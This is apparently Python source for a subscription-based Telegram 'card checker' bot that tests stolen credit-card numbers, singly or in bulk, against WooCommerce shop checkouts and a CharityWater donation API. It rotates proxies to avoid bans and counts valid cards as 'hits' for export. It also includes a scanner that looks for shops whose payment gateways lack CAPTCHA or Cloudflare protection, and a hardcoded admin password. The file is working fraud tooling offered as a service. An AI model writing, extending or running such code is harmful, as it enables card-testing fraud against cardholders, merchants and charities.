    if message.from_user.id != ADMIN_ID:
        return
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    args = message.text.split()[1:]
    if not args:
        bot.send_message(message.chat.id,
            "📡 *Add Proxy*\n\n"
            "Usage:\n"
            "`/addproxy 1.2.3.4:8080`\n"
            "`/addproxy 1.2.3.4:8080 5.6.7.8:3128`\n\n"
            "Or upload a `.txt` file named `proxy*` with one proxy per line.",
            parse_mode="Markdown")
        return
    valid = [p for p in args if ':' in p]
    if not valid:
        bot.send_message(message.chat.id, "❌ Invalid format. Required: `ip:port`", parse_mode="Markdown")
        return
    m = bot.send_message(message.chat.id, f"🔍 Checking {len(valid)} proxies...")
    def _check_and_add():
        working = add_proxies_to_pool(valid)
        bot.edit_message_text(
            f"✅ Added *{len(working)}* of *{len(valid)}* working proxies.",
            message.chat.id, m.message_id, parse_mode="Markdown"
        )
    threading.Thread(target=_check_and_add).start()

# ═══════════════════════════════════════
# /status (أدمن)
# ═══════════════════════════════════════
@bot.message_handler(commands=['status'])
def cmd_status(message):
    if message.from_user.id != ADMIN_ID:
        return
    a, b, d = proxy_pool.get_stats()
    bot.reply_to(
        message,
        f"📊 *Proxy Status:*\n🟢 Active: {a}\n🟡 Banned: {b}\n🔴 Dead: {d}",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════
# /test (أدمن) — تشخيص البوابات
# ═══════════���═══════════════════════════
@bot.message_handler(commands=['test'])
def cmd_test(message):
    if message.from_user.id != ADMIN_ID:
        return
    m = bot.reply_to(message, "🔍 Testing gateways...")
    threading.Thread(target=_run_gate_test,
                     args=(message.chat.id, m.message_id)).start()

def _run_gate_test(chat_id, msg_id):
    lines = ["🔍 *Gateway Diagnostics*", "━━━━━━━━━━━━━━━━━━━━━━"]
    for gid, info in GATES.items():
        if info.get('type') == 'cw':
            lines.append(f"{info['name']}: 🌊 CharityWater API (no test needed)")
            continue
        site = info['site']
        try:
            r = requests.get(f"{site}/my-account/", timeout=25,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            has_reg = bool(re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text))
            if r.status_code != 200:
                lines.append(f"{info['name']}: 🔴 HTTP {r.status_code}")
            elif not has_reg:
                lines.append(f"{info['name']}: 🟡 Live but registration form missing")
            else:
                lines.append(f"{info['name']}: 🟢 OK")
        except Exception as e:
            lines.append(f"{info['name']}: 🔴 {type(e).__name__}")
    a, b, d = proxy_pool.get_stats()
    lines += ["━━━━━━━━━━━━━━━━━━━━━━",
              f"📡 Proxies — 🟢 {a} | 🟡 {b} | 🔴 {d}"]
    if a == 0:
        lines.append("⚠️ _No active proxies — checking directly_")
    try:
        bot.edit_message_text("\n".join(lines), chat_id, msg_id, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"gate test error: {e}")

# ═══════════════════════════════════════
# /gate (backward compat)
# ═══════════════════════════════════════
@bot.message_handler(commands=['gate'])
def cmd_gate(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id,
                    "⛔ *اشتراكك غير نشط!*\n\nاستخدم 🎫 *كود تفعيل*.",
                    back_kb())
        return
    edit_banner(user_id, chat_id,
                "💳 *اختر البوابة* 👇",
                gates_kb('single'))

# ═══════════════════════════════════════
# /admin (لوحة الإدارة)
# ═══════════════════════════════════════
@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    bot.send_message(user_id, "🔐 *لوحة الإدارة*\nأرسل كلمة المرور:", parse_mode="Markdown")
    admin_session[user_id] = 'awaiting_password'

# ═══════════════════════════════════════
# معالجات حالة الأدمن (يجب قبل handle_text)
# ═══════════════════════════════════════
@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_password')
def admin_check_pw(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    if message.text.strip() == "Nemo@1986":
        admin_session[user_id] = 'authenticated'
        show_admin_menu(user_id)
    else:
        bot.send_message(user_id, "❌ كلمة المرور خاطئة.")
        admin_session.pop(user_id, None)

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_days')
def admin_create_days(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    try:
        days = int(message.text.strip())
        if days <= 0:
            raise ValueError
        code = generate_redeem_code(user_id, days)
        bot.send_message(
            user_id,
            f"✅ *تم إنشاء الكود:*\n📌 `{code}`\n📅 المدة: {days} يوم",
            parse_mode="Markdown"
        )
    except:
        bot.send_message(user_id, "❌ أرسل رقماً موجباً فقط.")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_proxy_input')
def admin_proxy_input(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    raw = message.text.strip()
    # Accept any format — normalize each line
    raw_lines = [p.strip() for p in raw.splitlines()
                 if p.strip() and (':' in p or p.strip().startswith('http'))]
    proxies   = [normalize_proxy(p) for p in raw_lines]
    proxies   = [p for p in proxies if p]   # drop None (unparseable)

    if not proxies:
        bot.send_message(
            user_id,
            "❌ No valid proxies found.\n\n"
            "Accepted formats:\n"
            "`ip:port`\n"
            "`user:pass@host:port`\n"
            "`host:port:user:pass` ← BrightData\n"
            "`https://user:pass@host:port`\n"
            "`socks5://user:pass@host:port`",
            parse_mode="Markdown"
        )
        admin_session[user_id] = 'authenticated'
        show_admin_menu(user_id)
        return

    rotating = [p for p in proxies if is_rotating_proxy(p)]
    regular  = [p for p in proxies if not is_rotating_proxy(p)]

    # All rotating — add instantly without testing
    if rotating and not regular:
        for p in rotating:
            proxy_pool.add_proxy(p)
        a, b, d = proxy_pool.get_stats()
        bot.send_message(
            user_id,
            f"⚡ *Added {len(rotating)} proxies instantly*\n\n"
            f"📡 Pool now: 🟢{a} active  🟡{b} banned  🔴{d} dead\n"
            f"Sample: `{rotating[0][:60]}`",
            parse_mode="Markdown"
        )
        admin_session[user_id] = 'authenticated'
        show_admin_menu(user_id)
        return

    suffix = f" + {len(rotating)} rotating (instant)" if rotating else ""
    m = bot.send_message(
        user_id,
        f"🔍 Testing *{len(regular)}* plain proxies{suffix}...",
        parse_mode="Markdown"
    )
    def _check():
        working = add_proxies_to_pool(proxies)
        rot_cnt = len([w for w in working if is_rotating_proxy(w)])
        reg_cnt = len(working) - rot_cnt
        a, b, d = proxy_pool.get_stats()
        lines = [f"✅ *Added {len(working)} proxies*"]
        if rot_cnt:
            lines.append(f"  ⚡ {rot_cnt} rotating (instant)")
        if reg_cnt:
            lines.append(f"  🔍 {reg_cnt}/{len(regular)} plain (passed test)")
        lines.append(f"\n📡 Pool: 🟢{a}  🟡{b}  🔴{d}")
        bot.edit_message_text(
            "\n".join(lines), user_id, m.message_id, parse_mode="Markdown"
        )
    threading.Thread(target=_check).start()
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_revoke')
def admin_revoke_input(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    code = message.text.strip()
    if revoke_code(code):
        bot.send_message(user_id, f"✅ تم إلغاء الكود `{code}` بنجاح.")
    else:
        bot.send_message(user_id, "❌ فشل إلغاء الكود (غير موجود أو مستخدم).")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

# ═══════════════════════════════════════
# معالج الملفات
# ═══════════════════════════════════════
@bot.message_handler(content_types=['document'])
def handle_doc(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    state   = user_session_state.get(user_id)

    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass

    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id, "⛔ *Subscription Inactive!*", back_kb())
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        content   = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        filename  = message.document.file_name.lower()
    except Exception as e:
        edit_banner(user_id, chat_id, f"❌ File download error: {e}", back_kb())
        return

    if "proxy" in filename:
        raw_p   = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
        proxies = [normalize_proxy(p) for p in raw_p]
        proxies = [p for p in proxies if p]
        if proxies:
            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
            edit_banner(user_id, chat_id,
                        f"📡 *Adding {len(proxies)} proxies...*",
                        back_kb())
        else:
            edit_banner(user_id, chat_id,
                        "❌ *No valid proxies found in file.*", back_kb())
        return

    if state == 'awaiting_gate_urls':
        urls = [u.strip() for u in content.splitlines() if u.strip()]
        if urls:
            user_session_state.pop(user_id, None)
            mid = user_main_message.get(user_id)
            threading.Thread(
                target=scan_gates_ui,
                args=(urls, chat_id, user_id, mid)
            ).start()
        else:
            edit_banner(user_id, chat_id, "❌ File is empty or contains no URLs.", back_kb())
        return

    if state == 'awaiting_bulk_cards':
        cards = extract_cards(content)
        if cards:
            user_session_state.pop(user_id, None)
            gate_id = user_gate_choice.get(user_id, '1')
            mid     = user_main_message.get(user_id)
            threading.Thread(
                target=check_bulk_ui,
                args=(cards, chat_id, user_id, gate_id, mid)
            ).start()
        else:
            edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
    else:
        edit_banner(user_id, chat_id,
                    "❌ *Select a gateway first from the main menu.*",
                    back_kb())

# ═══════════════════════════════════════
# معالج النصوص العام (يجب أن يكون الأخير)
# ═══════════════════════════════════════
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    state   = user_session_state.get(user_id)
    text    = message.text.strip() if message.text else ''

    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass

    # ─── كود التفعيل ───
    if state == 'awaiting_redeem_code':
        user_session_state.pop(user_id, None)
        ok, msg_text = redeem_code(user_id, text)
        icon = "✅" if ok else "❌"
        edit_banner(
            user_id, chat_id,
            f"{icon} *Activation Result*\n\n━━━━━━━━━━━━━━━━━━━━━━\n{msg_text}\n━━━━━━━━━━━━━━━━━━━━━━",
            back_kb()
        )
        return

    # ─── فحص مواقع (Gate Scanner) ───
    if state == 'awaiting_gate_urls':
        urls = [u.strip() for u in text.splitlines() if u.strip()]
        if not urls:
            edit_banner(user_id, chat_id, "❌ No URLs received.", back_kb())
            return
        user_session_state.pop(user_id, None)
        mid = user_main_message.get(user_id)
        threading.Thread(
            target=scan_gates_ui,
            args=(urls, chat_id, user_id, mid)
        ).start()
        return

    # ─── كارت واحد ───
    if state == 'awaiting_single_card':
        card = normalize_card(text)
        if card:
            user_session_state.pop(user_id, None)
            gate_id = user_gate_choice.get(user_id, '1')
            mid     = user_main_message.get(user_id)
            threading.Thread(
                target=check_single_ui,
                args=(card, chat_id, user_id, gate_id, mid)
            ).start()
        else:
            edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
        return

    # ─── مجموعة كروت ───
    if state == 'awaiting_bulk_cards':
        cards = extract_cards(text)
        if cards:
            user_session_state.pop(user_id, None)
            gate_id = user_gate_choice.get(user_id, '1')
            mid     = user_main_message.get(user_id)
            threading.Thread(
                target=check_bulk_ui,
                args=(cards, chat_id, user_id, gate_id, mid)
            ).start()
        else:
            edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
        return

    # ─── افتراضي: القائمة الرئيسية ───
    mid = user_main_message.get(user_id)
    if mid:
        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id))
    else:
        send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb(user_id))

# ═══════════════════════════════════════
# Callback: القائمة الرئيسية
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "main_menu")
def cb_main_menu(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_session_state.pop(user_id, None)
    user_main_message[user_id] = mid
    edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=mid)
    bot.answer_callback_query(call.id)

# ═══════════════════════════════════════
# Callback: فحص كارت واحد
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_single")
def cb_menu_single(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id,
                    "⛔ *Subscription Inactive!*\n\nUse 🎫 *Redeem Code* to activate.",
                    back_kb(), msg_id=mid)
        return

    edit_banner(user_id, chat_id,
                "💳 *Check Single Card*\n\n━━━━━━━━━━━━━━━━━━━━━━\n"
                "Select gateway 👇",
                gates_kb('single'), msg_id=mid)

# ═══════════════���═══════════════════════
# Callback: فحص مجموعة
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_bulk")
def cb_menu_bulk(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id,
                    "⛔ *Subscription Inactive!*\n\nUse 🎫 *Redeem Code* to activate.",
                    back_kb(), msg_id=mid)
        return

    edit_banner(user_id, chat_id,
                "📋 *Bulk Card Check*\n\n━━━━━━━━━━━━━━━━━━━━━━\n"
                "Select gateway 👇",
                gates_kb('bulk'), msg_id=mid)

# ═══════════════════════════════════════
# Callback: حسابى
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_admin")
def cb_menu_admin(call):
    user_id = call.from_user.id
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ غير مصرح لك.")
        return
    bot.answer_callback_query(call.id)
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

# ═══════════════════════════════════════
# Callback: حسابى
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_account")
def cb_menu_account(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    status_text, expire = get_subscription_info(user_id)
    cap = (
        "👤 *My Account*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 User ID: `{user_id}`\n"
        f"📊 Status: {status_text}\n"
    )
    if expire:
        cap += f"📅 Expires: `{expire}`\n"
    cap += "━━━━━━━━━━━━━━━━━━━━━━"

    edit_banner(user_id, chat_id, cap, back_kb(), msg_id=mid)

# ═══════════════════════════════════════
# Callback: كود تفعيل
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_redeem")
def cb_menu_redeem(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    user_session_state[user_id] = 'awaiting_redeem_code'
    edit_banner(
        user_id, chat_id,
        "🎫 *Redeem Code*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📩 Send your activation code\n"
        "_Example: ABCD1234EFGH_",
        back_kb(), msg_id=mid
    )

# ═══════════════════════════════════════
# Callback: اختيار البوابة
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data.startswith('gate_'))
def cb_gate(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    parts   = call.data.split('_')  # gate_1_single
    gate_id = parts[1]
    mode    = parts[2] if len(parts) > 2 else 'single'

    user_gate_choice[user_id] = gate_id
    gate_name = GATES[gate_id]['name']

    if mode == 'single':
        user_session_state[user_id] = 'awaiting_single_card'
        cap = (
            f"✅ *Selected: {gate_name}*\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Send card data in any format:\n"
            "`4111111111111111|12|25|123`\n"
            "`4111111111111111:12:25:123`\n"
            "`4111111111111111/12/25/123`\n"
            "`4111111111111111 12 25 123`\n"
            "`4111-1111-1111-1111/12/25/123`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "_Any separator is auto-detected_ ✨"
        )
    else:
        user_session_state[user_id] = 'awaiting_bulk_cards'
        cap = (
            f"✅ *Selected: {gate_name}*\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Send cards (one per line)\n"
            "Any separator: `|` `:` `/` `,` `-` or space\n\n"
            "📎 Or upload a `.txt` file\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "_Any separator is auto-detected_ ✨"
        )

    edit_banner(user_id, chat_id, cap, back_kb(), msg_id=mid)

# ═══════════════════════════════════════
# فحص كارت واحد (thread)
# ═══════════════════════════════════════
def check_single_ui(card_str, chat_id, user_id, gate_id, msg_id):
    gate_name = GATES[gate_id]['name']
    is_cw = GATES[gate_id].get('type') == 'cw'

    frames = ["⏳", "⌛"]
    for i in range(3):
        try:
            bot.edit_message_caption(
                caption=(
                    f"{frames[i%2]} *Checking...*\n\n"
                    f"🏦 Gateway: {gate_name}\n"
                    f"💳 `{card_str}`\n\n"
                    f"▶️▶️ Please wait..."
                ),
                chat_id=chat_id, message_id=msg_id,
                reply_markup=types.InlineKeyboardMarkup(),
                parse_mode="Markdown"
            )
        except:
            pass
        time.sleep(0.6)

    status, reason = _check_one_card(card_str, gate_id)
    bin6    = card_str.split('|')[0][:6]
    bin_inf = get_bin_info(bin6)

    # Return banner to main menu first
    try:
        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=msg_id)
    except:
        pass

    # Build result message
    if is_cw:
        result_msg = format_cw_result(status, reason, card_str, bin_inf)
    else:
        icon, label  = STATUS_LABEL.get(status, ("❌", "DECLINED"))
        safe_reason  = md_escape(reason)[:180] if reason else ""
        result_msg = (
            f"{icon} *{label}*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"𝐂𝐚𝐫𝐝 ➜ `{card_str}`\n"
            f"𝐁𝐈𝐍 ➜ {bin6} - {(bin_inf.get('type') or '?').upper()} - {(bin_inf.get('brand') or '?').upper()}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {(bin_inf.get('country') or 'Unknown').upper()} - {bin_inf.get('flag','🌍')}\n"
            f"𝐁𝐚𝐧𝐤 ➜ {md_escape(bin_inf.get('bank','Unknown'))}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
        )
        if safe_reason:
            result_msg += f"📄 _{safe_reason}_\n━━━━━━━━━━━━━━━━━━━━━━\n"
        result_msg += "Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧"

    try:
        bot.send_message(chat_id, result_msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"single card result error: {e}")

# ═══════════════════════════════════════
# فحص مجموعة كروت (thread) مع Progress Bar
# ═══════════════════════════════════════
def check_bulk_ui(cards, chat_id, user_id, gate_id, msg_id):
    total     = len(cards)
    gate_name = GATES[gate_id]['name']
    is_cw     = GATES[gate_id].get('type') == 'cw'
    send_mode = get_setting('send_mode', 'all')  # 'all' or 'hits_only'

    res  = {'hits': 0, 'declined': 0, 'error': 0, 'done': 0}
    lock = threading.Lock()
    last_edit  = [0.0]
    result_log = []   # for export

    def push_progress():
        now = time.time()
        with lock:
            if now - last_edit[0] < 2.5 and res['done'] < total:
                return
            last_edit[0] = now
            done = res['done']
            snap = dict(res)

        bar = progress_bar(done, total)
        cap = (
            f"🔄 *Checking...*\n\n"
            f"🏦 Gateway: {gate_name}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"`{bar}`\n"
            f"📈 *{done} / {total}* cards\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Hits: *{snap['hits']}*  |  "
            f"❌ Declined: *{snap['declined']}*  |  "
            f"⚠️ Error: *{snap['error']}*"
        )
        try:
            bot.edit_message_caption(
                caption=cap, chat_id=chat_id, message_id=msg_id,
                reply_markup=types.InlineKeyboardMarkup(),
                parse_mode="Markdown"
            )
        except:
            pass

    push_progress()

    def process_one(card):
        status, reason = _check_one_card(card, gate_id)
        bin6    = card.split('|')[0][:6]
        bin_inf = get_bin_info(bin6)
        is_hit  = _is_hit(status, gate_id)

        with lock:
            if is_hit:
                res['hits'] += 1
            elif status == 'DECLINED':
                res['declined'] += 1
            else:
                res['error'] += 1
            res['done'] += 1
            icon, label = STATUS_LABEL.get(status, ("⚠️", status))
            result_log.append(
                f"[{status}] {card} | {reason}"
            )
        push_progress()

        # Decide whether to send this result live
        # Errors always sent in 'all' mode so user can debug what's failing
        if send_mode == 'hits_only':
            should_send = is_hit
        else:  # 'all'
            should_send = True   # hits + declined + errors (so user sees the problem)

        if not should_send:
            return status

        if is_cw:
            if status == 'ERROR':
                # For errors show card + reason clearly
                icon, label = STATUS_LABEL.get('ERROR', ("⚠️", "Error"))
                msg_text = (
                    f"{icon} *{label}*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"𝐂𝐚𝐫𝐝 ➜ `{card}`\n"
                    f"📄 _{md_escape((reason or 'unknown')[:200])}_\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧"
                )
            else:
                msg_text = format_cw_result(status, reason, card, bin_inf)
        else:
            icon, label = STATUS_LABEL.get(status, ("✅", status))
            msg_text = (
                f"{icon} *{label}* | {gate_name}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"𝐂𝐚𝐫𝐝 ➜ `{card}`\n"
                f"𝐁𝐈𝐍 ➜ {bin6} - {(bin_inf.get('type') or '?').upper()} - {(bin_inf.get('brand') or '?').upper()}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {(bin_inf.get('country') or 'Unknown').upper()} - {bin_inf.get('flag','🌍')}\n"
                f"𝐁𝐚𝐧𝐤 ➜ {md_escape(bin_inf.get('bank','Unknown'))}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧"
            )
        try:
            bot.send_message(chat_id, msg_text, parse_mode="Markdown")
        except Exception as e:
            logger.error(f"bulk card send error: {e}")
        return status

    max_workers = int(get_setting('bulk_threads', '5'))
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(process_one, card): card for card in cards}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"bulk worker error: {e}")
                with lock:
                    res['error'] += 1
                    res['done']  += 1

    # Store results for export
    user_bulk_results[user_id] = list(result_log)

    # Return banner to main menu
    try:
        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=msg_id)
    except:
        pass

    # Summary message
    cap = (
        f"🏁 *Check Complete!*\n\n"
        f"🏦 Gateway: {gate_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Total:    *{total}*\n"
        f"✅ Hits:     *{res['hits']}*\n"
        f"❌ Declined: *{res['declined']}*\n"
        f"⚠️ Error:    *{res['error']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧"
    )
    try:
        export_kb = types.InlineKeyboardMarkup()
        export_kb.add(btn("📤 Export Results (.txt)", STYLE_PRIMARY, callback_data="export_results"))
        bot.send_message(chat_id, cap, parse_mode="Markdown", reply_markup=export_kb)
    except Exception as e:
        logger.error(f"bulk summary error: {e}")

# ═══════════════════════════════════════
# Callback: فحص المواقع (Gate Scanner)
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_gate_scan")
def cb_menu_gate_scan(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id,
                    "⛔ *Subscription Inactive!*\n\nUse 🎫 *Redeem Code* to activate.",
                    back_kb(), msg_id=mid)
        return

    user_session_state[user_id] = 'awaiting_gate_urls'
    edit_banner(
        user_id, chat_id,
        "🔍 *Gate Scanner*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 Send site URLs (one per line):\n"
        "`https://example.com`\n"
        "`http://shop.example.net`\n"
        "`example.org`\n\n"
        "📎 Or upload a `.txt` file with URLs\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🎯 Detects: payment gateway\n"
        "🛡️ Checks: Captcha / Cloudflare protection\n"
        "✅ Reports only unprotected gateways",
        back_kb(), msg_id=mid
    )


def scan_gates_ui(urls, chat_id, user_id, msg_id):
    """يفحص قائمة URLs ويرسل النتائج مع شريط تقدم"""
    total     = len(urls)
    res       = {'found': 0, 'no_gate': 0, 'secured': 0, 'failed': 0, 'done': 0}
    lock      = threading.Lock()
    last_edit = [0.0]

    def push_progress():
        now = time.time()
        with lock:
            if now - last_edit[0] < 2.5 and res['done'] < total:
                return
            last_edit[0] = now
            done = res['done']
            snap = dict(res)

        bar = progress_bar(done, total)
        cap = (
            f"🔍 *Scanning Sites...*\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"`{bar}`\n"
            f"📈 *{done} / {total}* sites\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Unprotected gateway: *{snap['found']}*\n"
            f"🛡️ Protected (Captcha/CF): *{snap['secured']}*\n"
            f"❌ No payment gateway: *{snap['no_gate']}*\n"
            f"⚠️ Fetch failed: *{snap['failed']}*"
        )
        try:
            bot.edit_message_caption(
                caption=cap, chat_id=chat_id, message_id=msg_id,
                reply_markup=types.InlineKeyboardMarkup(),
                parse_mode="Markdown"
            )
        except:
            pass

    # Initial message
    try:
        bot.edit_message_caption(
            caption=(
                f"🔍 *Scanning {total} sites...*\n\n"
                f"`{'░' * 14}   0%`\n"
                f"⏳ Please wait..."
            ),
            chat_id=chat_id, message_id=msg_id,
            reply_markup=types.InlineKeyboardMarkup(),
            parse_mode="Markdown"
        )
    except:
        pass

    def process_url(url):
        result, code = scan_single_url(url)
        with lock:
            if result is None:
                if code == 'NO_GATE':
                    res['no_gate'] += 1
                else:
                    res['failed'] += 1
            elif result['captcha'] or result['cloudflare']:
                res['secured'] += 1
            else:
                res['found'] += 1
            res['done'] += 1
        push_progress()

        # ✅ Unprotected site with gateway
        if result and not result['captcha'] and not result['cloudflare']:
            gates_str = md_escape(', '.join(result['gateways'][:6]))
            try:
                bot.send_message(
                    chat_id,
                    f"✅ *Site Ready!*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌐 `{result['url']}`\n"
                    f"💳 Gateways: _{gates_str}_\n"
                    f"🛡️ Security: 🟢 None\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧",
                    parse_mode="Markdown"
                )
            except:
                pass

        # 🛡️ Protected site
        elif result and (result['captcha'] or result['cloudflare']):
            sec_str   = ' + '.join(result['security'])
            gates_str = md_escape(', '.join(result['gateways'][:3]))
            try:
                bot.send_message(
                    chat_id,
                    f"🛡️ *Protected* | `{result['url']}`\n"
                    f"💳 _{gates_str}_ | 🔒 {sec_str}",
                    parse_mode="Markdown"
                )
            except:
                pass

    # تشغيل متوازي
    max_w = min(5, (os.cpu_count() or 2) + 2)
    with ThreadPoolExecutor(max_workers=max_w) as ex:
        futures = {ex.submit(process_url, url): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"gate scan worker error: {e}")
                with lock:
                    res['failed'] += 1
                    res['done']   += 1

    # Return banner to main menu
    try:
        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=msg_id)
    except:
        pass

    # Final summary
    summary = (
        f"🏁 *Gate Scan Complete!*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Total:               *{total}* sites\n"
        f"✅ Unprotected gateway: *{res['found']}*\n"
        f"🛡️ Protected (CF/CAPTCHA): *{res['secured']}*\n"
        f"❌ No payment gateway:  *{res['no_gate']}*\n"
        f"⚠️ Fetch failed:        *{res['failed']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧"
    )
    try:
        bot.send_message(chat_id, summary, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"gate scan summary error: {e}")


# ═══════════════════════════════════════
# Callback: Settings
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_settings")
def cb_menu_settings(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)
    _show_settings(user_id, chat_id, mid)

def _show_settings(user_id, chat_id, mid):
    send_mode   = get_setting('send_mode',    'all')
    threads     = int(get_setting('bulk_threads', '5'))
    mode_label  = "📨 All Results" if send_mode == 'all' else "🎯 Hits Only"
    mode_next   = 'hits_only'       if send_mode == 'all' else 'all'
    # Thread cycle: 3 → 5 → 10 → 3
    thread_cycle = {3: 5, 5: 10, 10: 3}
    next_threads = thread_cycle.get(threads, 5)

    a, b, d = proxy_pool.get_stats()
    cached  = len(_bin_cache)

